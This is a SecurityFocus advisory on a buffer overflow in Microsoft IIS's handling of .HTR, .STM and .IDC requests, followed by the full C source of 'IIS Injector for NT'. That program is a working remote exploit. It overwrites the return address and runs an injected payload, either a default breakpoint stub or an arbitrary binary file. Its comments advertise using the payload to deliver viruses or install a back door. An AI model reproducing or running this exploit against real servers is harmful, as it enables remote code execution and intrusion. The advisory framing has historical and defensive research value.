source: http://www.securityfocus.com/bid/307/info
   
Microsoft IIS reported prone to a buffer overflow vulnerability in the way IIS handles requests for several file types that require server side processing. This vulnerability may allow a remote attacker to execute arbitrary code on the target machine.
   
IIS supports a number of file extensions that require futher processing. When a request is made for one of these types of files a specific DLL processes it. A stack buffer overflow vulnerability exists in several of these DLL's while handling .HTR, .STM or .IDC extensions.

// IIS Injector for NT
// written by Greg Hoglund <hoglund@ieway.com>
// http://www.rootkit.com
//
// If you would like to deliver a payload, it must be stored in a binary file.
// This injector decouples the payload from the injection code allowing you to
// create a numnber of different attack payloads.  This code could be used, for
// example, by a military that needs to attack IIS servers, and has characterized
// the eligible hosts.  The proper attack can be chosen depending on needs. Since
// the payload is so large with this injection vector, many options are available.
// First and foremost, virii can delivered with ease.  The payload is also plenty
// large enough to remotely download and install a back door program.
// Considering the monoculture of NT IIS servers out on the 'Net, this represents a
// very serious security problem.

#include <windows.h>
#include <stdio.h>
#include <winsock.h>

void main(int argc, char **argv)
{
        SOCKET s = 0;
        WSADATA wsaData;

        if(argc < 2)
        {
                fprintf(stderr, "IIS Injector for NT\nwritten by Greg Hoglund, " \
                        "http://www.rootkit.com\nUsage: %s <target" \
                                                "ip> <optional payload file>\n", argv[0]);
                exit(0);
        }

        WSAStartup(MAKEWORD(2,0), &wsaData);

        s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(INVALID_SOCKET != s)
        {
                SOCKADDR_IN anAddr;
                anAddr.sin_family = AF_INET;
                anAddr.sin_port = htons(80);
                anAddr.sin_addr.S_un.S_addr = inet_addr(argv[1]);
   
                if(0 == connect(s, (struct sockaddr *)&anAddr, sizeof(struct sockaddr)))
                {
                        static char theSploit[4096];
                        // fill pattern
                        char kick = 'z'; //0x7a
                        char place = 'A';

                        // my uber sweet pattern gener@t0r
                        for(int i=0;i<4096;i+=4)
                        {
                                theSploit[i] = kick;
                                theSploit[i+1] = place;
                                theSploit[i+2] = place + 1;
                                theSploit[i+3] = place + 2;

                                if(++place == 'Y') // beyond 'XYZ'
                                {
                                        place = 'A';
                                        if(--kick < 'a') kick = 'a';
                                }
                        }

                        _snprintf(theSploit, 5, "get /");
                        _snprintf(theSploit + 3005, 22, "BBBB.htr HTTP/1.0\r\n\r\n\0");

                        // after crash, looks like inetinfo.exe is jumping to    the address
                        // stored @ location 'GHtG' (0x47744847)
                        // cross reference back to the buffer pattern, looks like we need
                        // to store our EIP into theSploit[598]

                        // magic eip into NTDLL.DLL   
                        theSploit[598] = (char)0xF0;
                        theSploit[599] = (char)0x8C;
                        theSploit[600] = (char)0xF8;
                        theSploit[601] = (char)0x77;
                
                        // code I want to execute
                        // will jump foward over the
                        // embedded eip, taking us
                        // directly to the payload
                        theSploit[594] = (char)0x90;  //nop
                        theSploit[595] = (char)0xEB;  //jmp
                        theSploit[596] = (char)0x35;  //
                        theSploit[597] = (char)0x90;  //nop
          
                        // the payload.  This code is executed remotely.
                        // if no payload is supplied on stdin, then this default
                        // payload is used.  int 3 is the debug interrupt and
                        // will cause your debugger to "breakpoint" gracefully.
                        // upon examiniation you will find that you are sitting
                        // directly in this code-payload.
                        if(argc < 3)
                        {
                                theSploit[650] = (char) 0x90; //nop
                                theSploit[651] = (char) 0x90; //nop
                                theSploit[652] = (char) 0x90; //nop
                                theSploit[653] = (char) 0x90; //nop
                                theSploit[654] = (char) 0xCC; //int 3
                                theSploit[655] = (char) 0xCC; //int 3
                                theSploit[656] = (char) 0xCC; //int 3
                                theSploit[657] = (char) 0xCC; //int 3
                                theSploit[658] = (char) 0x90; //nop
                                theSploit[659] = (char) 0x90; //nop
                                theSploit[660] = (char) 0x90; //nop  
                                theSploit[661] = (char) 0x90; //nop
                        }
                        else    
                        {
                                // send the user-supplied payload from
                                // a file.  Yes, that's a 2K buffer for
                                // mobile code.  Yes, that's big.
                                FILE *in_file;
                                in_file = fopen(argv[2], "rb");
                                if(in_file)
                                {
                                        int offset = 650;
                                        while( (!feof(in_file)) && (offset < 3000))
                                        {
                                                theSploit[offset++] = fgetc(in_file);
                                        }
                                        fclose(in_file);
                                }
                        }
                        send(s, theSploit, strlen(theSploit), 0);
                }
                closesocket(s);
        }
}